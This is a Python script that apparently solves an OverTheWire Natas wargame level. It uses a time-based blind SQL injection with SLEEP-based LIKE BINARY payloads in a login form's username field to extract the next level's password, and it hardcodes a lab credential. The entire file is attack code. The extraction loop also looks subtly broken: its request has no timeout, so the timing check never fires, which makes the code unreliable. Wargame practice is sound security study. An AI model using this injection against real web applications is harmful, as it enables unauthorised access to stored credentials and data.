import requests
import sys
import time

from string import ascii_letters, digits
from itertools import chain

CHAL_URL  = 'http://natas17.natas.labs.overthewire.org/'
CHAL_USER = 'natas17'
NEXT_USER = 'natas18'
CHAL_PASSWORD = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'

SLEEP_TIME = 2

SQLI_CHARSET = 'natas18" AND password LIKE BINARY "%%%s%%" AND SLEEP(%d)=1; #';
SQLI_PASSWORD = 'natas18" AND password LIKE BINARY "%s%s%%" AND SLEEP(%d)=1; #';

PASSWORD_LEN = 32

if __name__ == '__main__':

    creds = requests.auth.HTTPBasicAuth(CHAL_USER, CHAL_PASSWORD)
    charset = []
    password = ''

    print('[*] Constructing charset.')
    for c in chain(ascii_letters, digits):


        try:
            response = requests.post(CHAL_URL,
                auth=creds,
                data={ 'username' : SQLI_CHARSET % (c, SLEEP_TIME)},
                timeout=2,
            )
        except requests.exceptions.ReadTimeout:

                print('[$] Adding %s to charset.' % c)
                charset.append(c)

    print('[*] Using charset')
    print('     |')
    print('     ---> %s' % ' '.join(charset))


    print()
    print('[*] Bruteforcing %s password.' % NEXT_USER)
    for i in range(0, PASSWORD_LEN):

        for c in charset:

            try:
                response = requests.post(CHAL_URL,
                    auth=creds,
                    data={ 'username' : SQLI_PASSWORD % (password, c, SLEEP_TIME)},
                )
            except requests.exceptions.ReadTimeout:
                password = '%s%s' % (password, c)
                print('[*] Constructing password: %s' % password)
                break

    print()
    print('[$] Login for next level %s:%s' % (NEXT_USER, password))
